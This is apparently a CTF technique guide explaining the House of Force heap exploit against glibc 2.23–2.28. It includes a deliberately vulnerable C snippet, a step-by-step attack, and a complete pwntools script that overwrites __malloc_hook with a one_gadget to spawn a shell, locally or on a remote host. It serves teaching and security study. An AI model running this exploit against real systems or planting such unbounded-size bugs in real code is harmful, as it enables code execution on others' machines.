---
title: "House of Force - Top Chunk Overwrite to Arbitrary Allocation"
category: pwn
subcategory: heap
type: technique
tags: [house-of-force, top-chunk, wilderness, heap-overflow, arbitrary-allocation, malloc-hook, integer-overflow, uaf, tcache, pwndbg, gef, pwntools, one-gadget, glibc]
difficulty: medium
summary: "Set the top chunk size to -1 and malloc a wrapped-around size so the wilderness pointer moves to any address you choose. Dead from glibc 2.29."
when_to_use:
  - "glibc 2.23 - 2.28 and you can overflow into the top chunk's size field"
  - "The program lets you request an arbitrary (huge) allocation size"
  - "There is no free() at all, so UAF and double free are unavailable"
  - "You want an allocation directly over __malloc_hook or a .bss pointer array"
tools: [pwntools, pwndbg, gef, one-gadget]
related: [heap-overflow-adjacent, house-orange, heap-fake-chunk, heap-write-targets, heap-internals-primer]
---

## TL;DR

`malloc` carves requests out of the top chunk with a plain pointer bump and a single
comparison. Overwrite `top->size` with `0xFFFFFFFFFFFFFFFF`, then request
`target - top - 0x20`; the unsigned addition wraps and the top chunk pointer moves to
`target - 0x10`. The next `malloc` returns `target`. glibc 2.29 added a sanity check on
the top size and the technique is dead from there on.

## Recognise it

- A heap overflow (any size) that reaches the chunk following your buffer, and that
  chunk is the top chunk.
- `malloc(size)` with `size` read as a `long`/`size_t` from the user - you need to be
  able to ask for a huge value.
- The binary has **no free()**, which rules out every bin-based technique.
- `strings libc.so.6 | grep "GNU C Library"` says 2.23 - 2.28.

## Vulnerable code shape

```c
static char *buf;

void setup(void) {
    buf = malloc(0x20);
}

void do_write(void) {
    size_t n = read_size();
    read(0, buf, n);          /* BUG: n unbounded -> reaches top chunk's size */
}

void do_alloc(void) {
    size_t n = read_size();   /* BUG: n not validated, can be near SIZE_MAX */
    char *p = malloc(n);
    read(0, p, 0x20);
}
```

## Theory

Targets: glibc 2.23 - 2.28. Broken from 2.29.

`_int_malloc`'s last resort is `use_top`:

```c
victim = av->top;
size   = chunksize (victim);

if (__glibc_unlikely (size > av->system_mem))
  malloc_printerr ("malloc(): corrupted top size");     /* added in 2.29 */

if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
  {
    remainder_size = size - nb;
    remainder = chunk_at_offset (victim, nb);
    av->top = remainder;
    set_head (victim, nb | PREV_INUSE);
    set_head (remainder, remainder_size | PREV_INUSE);
    return chunk2mem (victim);
  }
```

Before 2.29 the only guard is `size >= nb + MINSIZE`. Set `size = (size_t)-1` and that
comparison is true for **every** `nb`. Then
`av->top = victim + nb`, and `nb` is attacker-chosen - including values that make the
addition wrap around the 64-bit space, so `av->top` can be *lower* than the heap.

### The arithmetic

You want the *next* `malloc` to return `target`. That malloc returns
`av->top + 0x10`, so you need `av->top == target - 0x10`.

```
av->top_new = top_chunk_addr + nb
nb          = target - 0x10 - top_chunk_addr
```

`nb` is the *chunk* size, i.e. `request_size` rounded up. Since you control the
request exactly and `request2size(r) = (r + 0x8 + 0xF) & ~0xF`, the easiest approach
is to ask for `evil_size` such that `request2size(evil_size) == nb`. In practice:

```
evil_size = target - 0x20 - top_chunk_addr
```

because the extra `0x10` accounts for the header of the chunk that `malloc` returns
plus the rounding. **Verify in gdb**: set a breakpoint after the evil malloc and check
`av->top`. Off-by-0x10 errors here are the norm, not the exception.

All arithmetic is mod 2^64, so `evil_size` is usually a gigantic number like
`0xFFFFFFFFFFFF14C0`. pwntools handles that if you mask with `& 0xFFFFFFFFFFFFFFFF`.

### Why 2.29 killed it

```c
if (__glibc_unlikely (size > av->system_mem))
  malloc_printerr ("malloc(): corrupted top size");
```

`av->system_mem` is the total memory the arena has obtained from the OS (0x21000 for a
fresh heap). `0xFFFFFFFFFFFFFFFF > 0x21000`, so the abort fires immediately. There is
no way around it: you would need `top->size` to stay under `system_mem`, which by
definition cannot reach an address far from the heap.

Note that the same commit is what makes `house-orange` fail too.

## Attack

glibc 2.27, goal: allocate over `__malloc_hook`.

1. `p = malloc(0x20)` - a normal chunk. Note its address; the top chunk starts at
   `p + 0x30` (0x20 chunk + header... concretely `p - 0x10 + 0x30`).
2. Leak libc. With no `free()`, use whatever the program offers (a format string, an
   uninitialised read, or an over-long read of the top chunk region). A large
   `malloc` that goes through `mmap` also gives a fixed offset from libc.
3. Overflow from `p`: write `0x28` bytes of padding, then `p64(0xFFFFFFFFFFFFFFFF)`
   over `top->size`.
4. Compute `evil = (malloc_hook - 0x20 - top_addr) & 0xFFFFFFFFFFFFFFFF`.
5. `malloc(evil)` - the top chunk pointer moves to `__malloc_hook - 0x10`.
   The returned pointer is junk; ignore it.
6. `malloc(0x18)` - returns `__malloc_hook - 0x10 + 0x10` region; in practice you get
   a chunk whose user data starts at `__malloc_hook - 0x10`... adjust `evil` by 0x10
   until `malloc` returns exactly `__malloc_hook - 0x10` so your 0x18-byte write
   covers the hook.
7. Write `p64(0) * 2 + p64(one_gadget)` so the third qword lands on `__malloc_hook`.
8. Trigger any `malloc` -> the gadget runs.

## Heap state

```text
before

 heap_base +0x000 | tcache struct (0x251)        |
           +0x250 | p: size 0x31                 |
           +0x260 | user data (ptr[0])           |
           +0x280 | TOP: prev_size               |
           +0x288 | TOP: size = 0x20d81          |
                  | ... wilderness ...           |


after the overflow (step 3)

           +0x288 | TOP: size = 0xffffffffffffffff |
                          ^ passes "size >= nb + MINSIZE" for ANY nb


step 5: malloc(evil) with evil = target - 0x20 - top_addr

   nb          = request2size(evil)
   av->top     = top_addr + nb                 (wraps mod 2^64)
               = __malloc_hook - 0x10
   remainder_size = 0xffffffffffffffff - nb    (still enormous, stays valid)

 libc:
   __malloc_hook - 0x10 | <- av->top now points HERE
   __malloc_hook - 0x08 | size field written by set_head
   __malloc_hook        | <- the NEXT malloc's user data starts here


step 6-7: malloc(0x18) returns __malloc_hook, write one_gadget

   __malloc_hook = <one_gadget>
   any subsequent malloc() -> execve("/bin/sh", ...)
```

## Exploit

```python
#!/usr/bin/env python3
"""House of Force: top chunk size = -1, then wrap malloc to __malloc_hook.

Target: glibc 2.23 - 2.28 ONLY. From 2.29 `malloc(): corrupted top size` aborts.

Usage:
    ./exploit.py
    ./exploit.py ONEGADGET=0x4f2c5
    ./exploit.py REMOTE HOST=1.2.3.4 PORT=1337
"""
from pwn import ELF, args, context, log, p64, process, remote, u64

BINARY = args.BIN or "./chal"
LIBC = args.LIBC or "./libc.so.6"

context.binary = ELF(BINARY, checksec=False)
context.log_level = args.LOG or "info"
libc = ELF(LIBC, checksec=False)

MASK = 0xFFFFFFFFFFFFFFFF


def evil_size(target: int, top_chunk: int) -> int:
    """Request size that moves av->top so the NEXT malloc returns `target`.

    av->top_new = top_chunk + request2size(evil)
    we want     = target - 0x10
    """
    return (target - 0x20 - top_chunk) & MASK


def request2size(req: int) -> int:
    return max(0x20, (req + 8 + 0xF) & ~0xF)


def _check_math():
    top = 0x555555757280
    tgt = 0x7FFFF7DCFB10
    ev = evil_size(tgt, top)
    assert (top + request2size(ev)) & MASK == tgt - 0x10, hex((top + request2size(ev)) & MASK)


_check_math()

io = (remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
      if args.REMOTE else process([BINARY]))


def menu(c):
    io.sendlineafter(b"> ", str(c).encode())


def alloc(size, data=b"A"):
    menu(1)
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendafter(b"content: ", data)


def overflow(data):
    """Write into the first chunk with no bound - reaches the top chunk header."""
    menu(2)
    io.sendlineafter(b"length: ", str(len(data)).encode())
    io.sendafter(b"content: ", data)


def leak_libc():
    """Whatever the challenge gives you. Here: the program prints a libc pointer."""
    menu(3)
    io.recvuntil(b"libc: ")
    return int(io.recvline().strip(), 16)


def leak_heap():
    menu(4)
    io.recvuntil(b"heap: ")
    return int(io.recvline().strip(), 16)


# ------------------------------------------------------------------ 1. leaks
libc_leak = leak_libc()
libc.address = libc_leak - libc.sym["puts"]
log.success("libc base = %#x", libc.address)

heap = leak_heap()
log.success("heap base = %#x", heap)

# ------------------------------------------------- 2. smash the top chunk size
alloc(0x20, b"first")
# The top chunk starts right after our 0x30 chunk:
TOP_OFF = 0x280                      # confirm with `pwndbg top_chunk`
top_chunk = heap + TOP_OFF
log.info("top chunk @ %#x", top_chunk)

overflow(b"A" * 0x28 + p64(MASK))    # 0x20 user + 0x8 prev_size, then top->size
log.success("top->size = 0xffffffffffffffff")

# ---------------------------------------------- 3. wrap malloc to the hook
malloc_hook = libc.sym["__malloc_hook"]
target = malloc_hook - 0x10          # so the following chunk's user data covers it
ev = evil_size(target, top_chunk)
log.info("evil malloc size = %#x", ev)

alloc(ev, b"junk")                   # moves av->top; the returned pointer is garbage

# --------------------------------------------------- 4. land on __malloc_hook
one_gadget = libc.address + int(args.ONEGADGET or "0x4f2c5", 0)
alloc(0x18, p64(0) + p64(0) + p64(one_gadget)[:8])
log.success("__malloc_hook = %#x", one_gadget)

# ------------------------------------------------------------- 5. detonate
menu(1)
io.sendlineafter(b"size: ", b"32")   # any malloc now runs the gadget
io.interactive()
```

## Variants & pitfalls

- **`malloc(): corrupted top size`** = glibc 2.29+. Stop; use a different technique.
- **Off-by-0x10.** The single most common failure. Set a breakpoint right after the
  evil malloc and print `main_arena.top`; adjust `evil_size` by +/-0x10 until it
  equals `target - 0x10`.
- **`top->size` must stay `PREV_INUSE`-ish.** `0xFFFFFFFFFFFFFFFF` has all flags set,
  which is fine. `0xFFFFFFFFFFFFFFF0` would clear `PREV_INUSE` and trip consolidation.
- **The evil malloc must not go through mmap.** `mmap_threshold` is 128 KB, but the
  check is `nb >= mp_.mmap_threshold` *and* `av->top` insufficient - since top is
  huge, the top path is taken first. Verify in gdb if the allocation returns something
  that looks mmap'd.
- **Targets below the heap.** Because the arithmetic is mod 2^64, `target` can be at a
  *lower* address than the heap (e.g. a non-PIE `.bss`); `evil_size` is then a huge
  positive number and it still works.
- **No leak, non-PIE binary.** Target the binary's `.bss` global pointer array instead
  of libc - no leak needed at all.
- **After the attack the heap is unusable**: `av->top` points into libc and
  `remainder_size` is nonsense. Do the payoff in the very next allocation.

## Debugging

```text
pwndbg> top_chunk                     # address and size of the wilderness
pwndbg> p main_arena.top
pwndbg> p/x main_arena.system_mem     # the 2.29 check compares against this
pwndbg> x/4gx <top_chunk>
pwndbg> b *_int_malloc
pwndbg> vis_heap_chunks 6
pwndbg> p &__malloc_hook
gef>  heap chunks
```

```bash
# Is this libc still vulnerable?
strings ./libc.so.6 | grep -c "corrupted top size"   # 1 => 2.29+, House of Force is dead
```

## Tools

- `pwndbg top_chunk` - the fastest way to verify each step.
- `one_gadget` for the `__malloc_hook` payload.
- `how2heap house_of_force.c` for a version-matched reference.

## References

- shellphish `how2heap`: `house_of_force.c`.
- glibc `malloc/malloc.c`: `_int_malloc`, the `use_top` label.
- CTF Wiki, "House of Force".
